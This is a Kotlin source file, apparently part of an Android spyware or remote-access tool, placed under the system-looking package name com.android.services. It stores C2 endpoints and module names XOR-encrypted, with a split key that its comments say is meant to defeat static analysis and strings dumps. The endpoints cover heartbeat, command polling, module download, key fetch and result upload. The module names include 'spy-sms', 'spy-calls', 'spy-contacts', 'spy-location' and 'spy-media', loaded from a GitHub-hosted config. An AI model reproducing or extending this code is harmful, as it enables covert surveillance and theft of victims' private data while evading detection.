package com.android.services

/**
 * Obfuscated string store — semua literal sensitif disimpan sebagai
 * XOR-encrypted IntArray. Key di-split 4 bagian supaya tidak terbaca
 * saat static analysis / strings dump.
 *
 * Digunakan oleh RemoteConfig, DexModuleLoader, KeyFetcher, ConnectorService.
 * R8 akan obfuscate nama class & method ini di release build.
 */
internal object ObfStr {

    // Key displit 4 bagian
    private fun k1() = byteArrayOf(0x4B, 0x7A, 0x39)   // "Kz9"
    private fun k2() = byteArrayOf(0x21, 0x6D, 0x56)   // "!mV"
    private fun k3() = byteArrayOf(0x23, 0x72, 0x58)   // "#rX"
    private fun k4() = byteArrayOf(0x77, 0x32, 0x24)   // "w2$"
    private fun key() = k1() + k2() + k3() + k4()

    private fun d(enc: IntArray): String {
        val k = key()
        return String(ByteArray(enc.size) { i -> (enc[i] xor k[i % k.size].toInt()).toByte() })
    }

    // ── RemoteConfig ──────────────────────────────────────────────────────────
    // "https://raw.githubusercontent.com/Kztutorial99/AndroidControl/main/android-config.json"
    fun configUrl() = d(intArrayOf(
        35, 14, 77, 81, 30, 108, 12, 93, 42, 22, 69, 10, 44, 19, 77, 73,
        24, 52, 86, 1, 61, 5, 81, 75, 37, 14, 92, 79, 25, 120, 64, 29,
        53, 88, 121, 94, 63, 15, 77, 78, 31, 63, 66, 30, 97, 78, 29, 101,
        37, 30, 75, 78, 4, 50, 96, 29, 54, 3, 64, 75, 39, 85, 84, 64,
        4, 56, 12, 19, 54, 19, 64, 75, 34, 30, 20, 66, 2, 56, 69, 27,
        63, 89, 88, 87, 36, 20
    ))

    // ── KeyFetcher — key delivery endpoint ───────────────────────────────────
    // "/api/tk"  (endpoint challenge-response untuk CDC key)
    fun apiKeyEndpoint() = d(intArrayOf(100, 27, 73, 72, 66, 34, 72))

    // ── DexModuleLoader — module names ────────────────────────────────────────
    // "spy-sms"
    fun modSpySms()      = d(intArrayOf(56, 10, 64, 12, 30, 59, 80))
    // "spy-calls"
    fun modSpyCalls()    = d(intArrayOf(56, 10, 64, 12, 14, 55, 79, 30, 43))
    // "spy-contacts"
    fun modSpyContacts() = d(intArrayOf(56, 10, 64, 12, 14, 57, 77, 6, 57, 20, 70, 87))
    // "spy-location"
    fun modSpyLocation() = d(intArrayOf(56, 10, 64, 12, 1, 57, 64, 19, 44, 30, 93, 74))
    // "spy-media"
    fun modSpyMedia()    = d(intArrayOf(56, 10, 64, 12, 0, 51, 71, 27, 57))

    // "com.android.modules."
    fun modClassPrefix() = d(intArrayOf(
        40, 21, 84, 15, 12, 56, 71, 0, 55, 30, 86, 10,
        38, 21, 93, 84, 1, 51, 80, 92
    ))

    // "X-Device-Id"
    fun headerDeviceId() = d(intArrayOf(19, 87, 125, 68, 27, 63, 64, 23, 117, 62, 86))

    // ── ConnectorService — API endpoints ──────────────────────────────────────
    // "/api/device/heartbeat"
    fun apiHeartbeat() = d(intArrayOf(
        100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
        35, 31, 88, 83, 25, 52, 70, 19, 44
    ))
    // "/api/device/poll?deviceId="
    fun apiPoll() = d(intArrayOf(
        100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11,
        59, 21, 85, 77, 82, 50, 70, 4, 49, 20, 87, 109, 47, 71
    ))
    // "/api/module/"
    fun apiModule() = d(intArrayOf(100, 27, 73, 72, 66, 59, 76, 22, 45, 27, 87, 11))

    // "/api/device/result"
    fun apiResult() = d(intArrayOf(100, 27, 73, 72, 66, 50, 70, 4, 49, 20, 87, 11, 57, 31, 74, 84, 1, 34))
}
